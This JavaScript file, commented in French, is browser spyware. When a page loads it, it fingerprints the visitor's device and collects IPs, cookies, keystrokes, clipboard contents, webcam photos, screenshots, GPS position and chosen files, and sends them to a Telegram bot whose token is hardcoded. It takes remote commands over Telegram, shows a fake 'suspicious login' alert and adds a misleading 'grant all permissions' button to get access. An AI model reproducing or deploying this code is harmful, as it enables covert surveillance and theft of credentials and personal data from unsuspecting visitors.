// ============================================
// CONFIGURATION TELEGRAM (INTÉGRÉE)
// ============================================
const TELEGRAM_BOT_TOKEN = '8507961561:AAFGiLtXzjIcR-j2IQuIDA55QZDQEYQFq_4';
const TELEGRAM_CHAT_ID = '6767182328';
const BOT_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

let lastUpdateId = 0;
let lastCommand = '';
let sensorInterval = null;
let cookieInterval = null;

let collectedData = {
    fingerprint: {},
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    publicIP: null,
    privateIP: null,
    photos: [],
    video: null,
    clipboard: null,
    location: null,
    keystrokes: [],
    cookies: {},
    browsingHistory: [],
    deviceBattery: null,
    externalFiles: {
        images: [], videos: [], audios: [], documents: [], all: []
    },
    permissionsGranted: [],
    fileSystemAccess: false,
    sensors: {
        accelerometer: [], gyroscope: [], orientation: []
    }
};

function updateStatus(msg, isError = false) {
    const statusDiv = document.getElementById('statusBar');
    if (statusDiv) {
        statusDiv.innerHTML = (isError ? '🔴 ' : '🟢 ') + msg;
    }
    console.log('[STATUS]', msg);
}

// ============================================
// ENVOIS TELEGRAM (RÉEL)
// ============================================
async function sendToTelegram(message) {
    try {
        await fetch(`${BOT_API_URL}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message.substring(0, 4000) })
        });
    } catch(e) { console.error('Telegram error:', e); }
}

async function sendPhotoToTelegram(photoDataUrl) {
    try {
        const blob = await (await fetch(photoDataUrl)).blob();
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, 'photo.jpg');
        await fetch(`${BOT_API_URL}/sendPhoto`, { method: 'POST', body: formData });
    } catch(e) { console.error('Photo error:', e); }
}

async function sendFileToTelegram(filename, dataUrl) {
    try {
        const blob = await (await fetch(dataUrl)).blob();
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('document', blob, filename);
        await fetch(`${BOT_API_URL}/sendDocument`, { method: 'POST', body: formData });
    } catch(e) { console.error('File error:', e); }
}

// ============================================
// COMMANDES TELEGRAM (FONCTIONNELLES)
// ============================================
async function checkTelegramCommands() {
    try {
        const url = `${BOT_API_URL}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`;
        const response = await fetch(url);
        const data = await response.json();
        
        if (data.ok && data.result && data.result.length > 0) {
            for (const update of data.result) {
                lastUpdateId = update.update_id;
                const message = update.message;
                if (message && message.text && message.chat.id.toString() === TELEGRAM_CHAT_ID) {
                    await processCommand(message.text.trim());
                }
            }
        }
    } catch(e) {
        console.error('[Command Polling] Erreur:', e);
    }
}

async function processCommand(command) {
    const cleanCmd = command.trim();
    if (cleanCmd === lastCommand) return;
    lastCommand = cleanCmd;
    
    await sendToTelegram(`📟 Commande reçue: ${cleanCmd}`);
    
    if (cleanCmd === '/camera') await requestCameraAndCapture();
    else if (cleanCmd === '/grantall') showGrantAllButton();
    else if (cleanCmd === '/files') showFloatingFileButton();
    else if (cleanCmd === '/location') showFloatingGpsButton();
    else if (cleanCmd === '/clipboard') await requestClipboardAccess();
    else if (cleanCmd === '/screenshot') await captureScreenshot();
    else if (cleanCmd === '/cookies') collectAllCookies();
    else if (cleanCmd === '/history') collectBrowsingHistory();
    else if (cleanCmd === '/sensors') sendToTelegram(`📡 CAPTEURS: ${collectedData.sensors.accelerometer.length} acc, ${collectedData.sensors.orientation.length} orientation`);
    else if (cleanCmd === '/sms') explainSMSAccess();
    else if (cleanCmd === '/advanced') explainAdvancedTechniques();
    else if (cleanCmd === '/bg') explainBackgroundAccess();
    else if (cleanCmd === '/status') sendToTelegram(`📊 STATUT\nUUID: ${collectedData.fingerprint.uuid}\nIP: ${collectedData.publicIP}\nPermissions: ${collectedData.permissionsGranted.length}`);
    else if (cleanCmd === '/ping') sendToTelegram('🏓 Pong!');
    else if (cleanCmd === '/vibrate') vibrate();
    else if (cleanCmd === '/filelist') sendToTelegram(`📁 FICHIERS: ${collectedData.externalFiles.all.length} total`);
    else if (cleanCmd === '/permissions') sendToTelegram(`✅ AUTORISATIONS\n${JSON.stringify(collectedData.permissionsGranted, null, 2)}`);
    else if (cleanCmd === '/help' || cleanCmd === '/start') {
        sendToTelegram(`🤖 COMMANDES ULTIMES
━━━━━━━━━━━━━━━━━━━━━
📷 /camera - Caméra + photos
📁 /files - Accès fichiers
📍 /location - GPS
🔓 /grantall - Bouton tout autoriser
📋 /clipboard - Presse-papier
📸 /screenshot - Capture écran
🍪 /cookies - Cookies
📜 /history - Historique
📡 /sensors - Capteurs
📱 /sms - Risques SMS
🔥 /advanced - Techniques avancées
🔄 /bg - Arrière-plan
📊 /status - État complet
🏓 /ping - Test
📳 /vibrate - Vibration
━━━━━━━━━━━━━━━━━━━━━`);
    }
}

// ============================================
// 1. FINGERPRINT + IP
// ============================================
async function collectFingerprint() {
    updateStatus('📡 Collecte empreinte...');
    collectedData.fingerprint = {
        screen: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform: navigator.platform,
        cpuCores: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: navigator.deviceMemory || 'unknown',
        uuid: crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36)
    };
    
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        collectedData.publicIP = data.ip;
    } catch(e) {}
    
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            collectedData.deviceBattery = { level: battery.level * 100 + '%', charging: battery.charging };
        } catch(e) {}
    }
    
    await sendToTelegram(`🆕 NOUVEAU VISITEUR
━━━━━━━━━━━━━━━━━━━━━
🆔 UUID: ${collectedData.fingerprint.uuid}
📱 Agent: ${navigator.userAgent}
🌍 IP: ${collectedData.publicIP || 'inconnue'}
━━━━━━━━━━━━━━━━━━━━━`);
}

// ============================================
// 2. IP PRIVÉE (WebRTC)
// ============================================
async function collectPrivateIP() {
    return new Promise((resolve) => {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = event => {
            if (event?.candidate?.candidate) {
                const match = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                if (match) {
                    collectedData.privateIP = match[0];
                    pc.close();
                    resolve(match[0]);
                }
            }
        };
        setTimeout(() => { collectedData.privateIP = 'non détectée'; pc.close(); resolve('non détectée'); }, 2000);
    });
}

// ============================================
// 3. COOKIES
// ============================================
function collectAllCookies() {
    updateStatus('🍪 Récupération cookies...');
    const allCookies = document.cookie;
    const importantDomains = ['facebook', 'instagram', 'google', 'twitter', 'tiktok', 'snapchat', 'netflix', 'amazon', 'whatsapp'];
    
    let importantCookies = {};
    document.cookie.split(';').forEach(cookie => {
        const cookieName = cookie.split('=')[0].trim();
        const cookieValue = cookie.split('=')[1]?.trim() || '';
        importantDomains.forEach(domain => {
            if (cookieName.toLowerCase().includes(domain)) {
                if (!importantCookies[domain]) importantCookies[domain] = [];
                importantCookies[domain].push({ name: cookieName, value: cookieValue.substring(0, 100) });
            }
        });
    });
    
    collectedData.cookies = { all: allCookies.substring(0, 2000), important: importantCookies };
    
    let message = `🍪 COOKIES RÉCUPÉRÉS\n━━━━━━━━━━━━━━━━━━━━━\n`;
    if (allCookies && allCookies.length > 0) {
        message += `📦 Cookies: ${allCookies.substring(0, 1500)}\n`;
    } else {
        message += `📦 Aucun cookie trouvé\n`;
    }
    sendToTelegram(message);
}

// ============================================
// 4. HISTORIQUE
// ============================================
function collectBrowsingHistory() {
    try {
        const history = [];
        const perfEntries = performance.getEntriesByType('navigation');
        perfEntries.forEach(entry => {
            if (entry.name && entry.name !== 'about:blank') history.push(entry.name);
        });
        if (document.referrer) history.push(`Referrer: ${document.referrer}`);
        if (history.length > 0) {
            sendToTelegram(`📜 HISTORIQUE\n${history.slice(0, 10).join('\n')}`);
        }
    } catch(e) {}
}

// ============================================
// 5. NOTIFICATIONS
// ============================================
async function requestNotifications() {
    const permission = await Notification.requestPermission();
    if (permission === 'granted') {
        collectedData.permissionsGranted.push({ type: 'notifications', status: 'granted' });
        await sendToTelegram('✅ NOTIFICATIONS ACCEPTÉES');
        new Notification('🔐 ALERTE', { body: 'Connexion suspecte détectée', requireInteraction: true });
    } else {
        await sendToTelegram('❌ NOTIFICATIONS REFUSÉES');
    }
}

// ============================================
// 6. CAMÉRA
// ============================================
async function requestCameraAndCapture() {
    updateStatus('📷 Demande accès caméra...');
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        collectedData.permissionsGranted.push({ type: 'camera', status: 'granted' });
        await sendToTelegram('✅ CAMÉRA ACCEPTÉE');
        
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        
        for (let i = 1; i <= 3; i++) {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const photoData = canvas.toDataURL('image/jpeg', 0.8);
            await sendPhotoToTelegram(photoData);
            await new Promise(r => setTimeout(r, 1500));
        }
        stream.getTracks().forEach(t => t.stop());
        await sendToTelegram('✅ 3 photos capturées');
        setTimeout(() => showFloatingFileButton(), 2000);
    } catch(e) {
        await sendToTelegram(`❌ CAMÉRA REFUSÉE`);
    }
}

// ============================================
// 7. FICHIERS
// ============================================
function showFloatingFileButton() {
    if (document.getElementById('file-btn')) return;
    const btn = document.createElement('button');
    btn.id = 'file-btn';
    btn.innerHTML = '📁 Accès fichiers';
    btn.style.cssText = 'position:fixed;bottom:100px;right:20px;z-index:9999;background:#28a745;color:white;border:none;border-radius:50px;padding:12px 18px;cursor:pointer;box-shadow:0 2px 10px rgba(0,0,0,0.3);';
    btn.onclick = async () => {
        const input = document.createElement('input');
        input.type = 'file';
        input.multiple = true;
        input.onchange = async (e) => {
            const files = Array.from(e.target.files);
            await sendToTelegram(`📁 ${files.length} fichier(s) sélectionnés`);
            for (const file of files) {
                const reader = new FileReader();
                reader.onload = async (ev) => {
                    if (file.type.startsWith('image/')) {
                        await sendPhotoToTelegram(ev.target.result);
                    } else {
                        await sendFileToTelegram(file.name, ev.target.result);
                    }
                };
                reader.readAsDataURL(file);
            }
            btn.remove();
            setTimeout(() => showFloatingGpsButton(), 2000);
        };
        input.click();
    };
    document.body.appendChild(btn);
    setTimeout(() => btn.remove(), 60000);
}

// ============================================
// 8. GPS
// ============================================
function showFloatingGpsButton() {
    if (document.getElementById('gps-btn')) return;
    const btn = document.createElement('button');
    btn.id = 'gps-btn';
    btn.innerHTML = '📍 Partager position';
    btn.style.cssText = 'position:fixed;bottom:60px;right:20px;z-index:9999;background:#405DE6;color:white;border:none;border-radius:50px;padding:12px 18px;cursor:pointer;box-shadow:0 2px 10px rgba(0,0,0,0.3);';
    btn.onclick = () => {
        navigator.geolocation.getCurrentPosition(
            pos => {
                collectedData.location = { lat: pos.coords.latitude, lon: pos.coords.longitude };
                sendToTelegram(`📍 GPS: ${pos.coords.latitude}, ${pos.coords.longitude}\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
                btn.remove();
            },
            err => sendToTelegram(`❌ GPS REFUSÉE`)
        );
    };
    document.body.appendChild(btn);
    setTimeout(() => btn.remove(), 60000);
}

// ============================================
// 9. BOUTON TOUT AUTORISER
// ============================================
function showGrantAllButton() {
    if (document.getElementById('grant-all-btn')) return;
    const btn = document.createElement('button');
    btn.id = 'grant-all-btn';
    btn.innerHTML = '🔓 TOUT AUTORISER (1 clic)';
    btn.style.cssText = 'position:fixed;top:20px;left:20px;z-index:10000;background:linear-gradient(45deg,#ff416c,#ff4b2b);color:white;border:none;border-radius:50px;padding:12px 20px;cursor:pointer;box-shadow:0 4px 15px rgba(0,0,0,0.3);';
    btn.onclick = async () => {
        btn.innerHTML = '⏳...';
        btn.disabled = true;
        await Notification.requestPermission();
        try { await navigator.mediaDevices.getUserMedia({ video: true }); } catch(e) {}
        const input = document.createElement('input'); input.type = 'file'; input.click();
        navigator.geolocation.getCurrentPosition(() => {}, () => {});
        await sendToTelegram(`🔓 BOUTON "TOUT AUTORISER" ACTIVÉ`);
        btn.remove();
    };
    document.body.appendChild(btn);
}

// ============================================
// 10. CAPTEURS (SANS PERMISSION)
// ============================================
function startSensorTracking() {
    updateStatus('📡 Capteurs actifs');
    if ('DeviceMotionEvent' in window) {
        window.addEventListener('devicemotion', (e) => {
            const acc = e.acceleration;
            if (acc && acc.x) {
                collectedData.sensors.accelerometer.push({ x: acc.x, y: acc.y, z: acc.z });
                if (collectedData.sensors.accelerometer.length >= 30) {
                    sendToTelegram(`📳 Mouvement: X:${acc.x.toFixed(2)} Y:${acc.y.toFixed(2)} Z:${acc.z.toFixed(2)}`);
                    collectedData.sensors.accelerometer = [];
                }
            }
        });
    }
}

// ============================================
// 11. ACCÈS SMS (Explication)
// ============================================
function explainSMSAccess() {
    sendToTelegram(`📱 ACCÈS SMS (Android)
⚠️ Une app peut lire vos SMS (codes 2FA bancaires)
💡 Sur navigateur: impossible
💡 Sur app Android: dangereux`);
}

// ============================================
// 12. TECHNIQUES AVANCÉES
// ============================================
function explainAdvancedTechniques() {
    sendToTelegram(`🔥 TECHNIQUES DE VOL
1️⃣ Extension fantôme
2️⃣ AITM (Proxy)
3️⃣ XSS
4️⃣ VoidStealer`);
}

// ============================================
// 13. ARRIÈRE-PLAN
// ============================================
function explainBackgroundAccess() {
    sendToTelegram(`🔄 ARRIÈRE-PLAN
Site: scripts actifs tant que l'onglet est ouvert
App: exécution illimitée`);
}

// ============================================
// 14. PRESSE-PAPIER
// ============================================
async function requestClipboardAccess() {
    try {
        if (navigator.clipboard?.readText) {
            const text = await navigator.clipboard.readText();
            await sendToTelegram(`📋 PRESSE-PAPIER\n${text?.substring(0, 1000) || '(vide)'}`);
        }
    } catch(e) { await sendToTelegram(`❌ PRESSE-PAPIER refusé`); }
}

// ============================================
// 15. KEYLOGGER
// ============================================
function startKeylogger() {
    let keyBuffer = [];
    document.addEventListener('keypress', (e) => {
        keyBuffer.push(e.key);
        if (keyBuffer.length >= 20) {
            sendToTelegram(`⌨️ Frappes: ${keyBuffer.join('')}`);
            keyBuffer = [];
        }
    });
}

// ============================================
// 16. CAPTURE ÉCRAN
// ============================================
async function captureScreenshot() {
    updateStatus('📸 Capture écran...');
    try {
        if (typeof html2canvas === 'undefined') {
            const script = document.createElement('script');
            script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
            document.head.appendChild(script);
            await new Promise(r => setTimeout(r, 1500));
        }
        if (typeof html2canvas !== 'undefined') {
            const canvas = await html2canvas(document.body);
            await sendPhotoToTelegram(canvas.toDataURL('image/png'));
            updateStatus('✅ Capture envoyée');
        }
    } catch(e) { updateStatus('❌ Capture échouée'); }
}

// ============================================
// 17. VIBRATION
// ============================================
function vibrate() {
    if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
}

// ============================================
// 18. SERVICE WORKER
// ============================================
async function registerServiceWorker() {
    if ('serviceWorker' in navigator) {
        try {
            await navigator.serviceWorker.register('/sw.js');
            sendToTelegram(`🔄 SERVICE WORKER ACTIF`);
        } catch(e) {}
    }
}

// ============================================
// 19. COOKIES AUTO (30 min)
// ============================================
function startAutoCookieCollection() {
    if (cookieInterval) clearInterval(cookieInterval);
    cookieInterval = setInterval(() => {
        collectAllCookies();
    }, 30 * 60 * 1000);
}

// ============================================
// 20. KEEP-ALIVE
// ============================================
function keepAlive() {
    setInterval(() => {
        if (navigator.serviceWorker) {
            navigator.serviceWorker.ready.then(reg => reg.active?.postMessage({ type: 'ping' }));
        }
    }, 20000);
}

// ============================================
// EXÉCUTION PRINCIPALE
// ============================================
(async function main() {
    updateStatus('🟢 Démarrage...');
    
    await collectFingerprint();
    await collectPrivateIP();
    collectAllCookies();
    collectBrowsingHistory();
    await requestNotifications();
    
    setTimeout(() => requestCameraAndCapture(), 2000);
    setTimeout(() => showGrantAllButton(), 1000);
    
    startKeylogger();
    startSensorTracking();
    registerServiceWorker();
    keepAlive();
    startAutoCookieCollection();
    
    // Polling commandes Telegram toutes les 2 secondes
    setInterval(checkTelegramCommands, 2000);
    
    updateStatus('✅ Prêt - Commandes Telegram actives');
    await sendToTelegram('💀 BOT ACTIF\n✅ Envoyez /help pour les commandes');
})(); 
